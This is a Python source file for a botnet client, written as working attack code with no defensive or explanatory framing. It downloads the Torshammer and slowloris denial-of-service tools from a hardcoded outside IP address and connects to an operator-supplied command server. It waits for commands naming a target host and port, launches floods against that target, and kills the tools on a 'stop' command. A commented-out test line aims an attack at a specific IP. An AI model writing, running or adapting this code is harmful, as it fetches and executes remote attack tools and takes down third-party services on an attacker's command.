import socket
import select
import sys
import urllib.request
from zipfile import ZipFile
import os
import time
import threading

def download_tool():
    if os.path.exists('dos-tools'):
        print('[!] Tool DoS exists')    
        return
    print('[!] Botnet download tool DoS')
    urls = ['http://54.90.18.45/dos-tools/torshammer1.0.zip',
    'http://54.90.18.45/dos-tools/slowloris.py']
    
    f = open('tool.txt', 'w')
    if not os.path.exists('dos-tools'):
        os.mkdir('dos-tools')
    
    for url in urls:
        filename = url.split('/')[-1]
        try:
            urllib.request.urlretrieve(url, f'dos-tools/{filename}')
            f.writelines(filename+"\n")
        except:
            pass
        
        if '.zip' in filename and os.path.exists(f'dos-tools/{filename}'):
            with ZipFile(f'dos-tools/{filename}', 'r') as zipObj:
               zipObj.extractall('dos-tools')
    print('[+] Done')
               
def excute(cmd):
    os.system(cmd)            
               
def attack(target, port, thread=None):
    print('[!] Start attack...')
    if os.path.exists('dos-tools/slowloris.py'):
        t = threading.Thread(target=excute, args=(f'python3 dos-tools/slowloris.py {target} -p {port}&',))
        t.start()
    
    if os.path.exists('dos-tools/Torshammer1.0/torshammer.py'):
        if not thread: thread = 100
        t = threading.Thread(target=excute, args=(f'python dos-tools/Torshammer1.0/torshammer.py -t {target} -r {thread}&',))
        t.start()
        
def stop():
    name_tool = ['slowloris', 'torshammer']
    for name in name_tool:
        os.system("kill $(ps aux | grep "+name+" | awk '{print $2}')")

#download_tool()
#attack('35.232.114.188', 80, 200)
#sleep(10)
#stop()
#exit()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if len(sys.argv) != 3:
    print ("Correct usage: script, IP address, port number")
    exit()
IP_address = str(sys.argv[1])
Port = int(sys.argv[2])
server.connect((IP_address, Port))

download_tool()

while True:
    sockets_list = [sys.stdin, server]
    read_sockets,write_socket, error_socket = select.select(sockets_list, [], [])
    for socks in read_sockets:
        if socks == server:
            message = socks.recv(2048).decode('ascii')
            print (message)
            if ':' in message:
                que = message.split(':')
                if len(que) == 3: attack(que[1], int(que[2]))
                elif len(que) == 4: attack(que[1], int(que[2]), int(que[3]))
            if 'stop' in message:
                stop()
server.close()
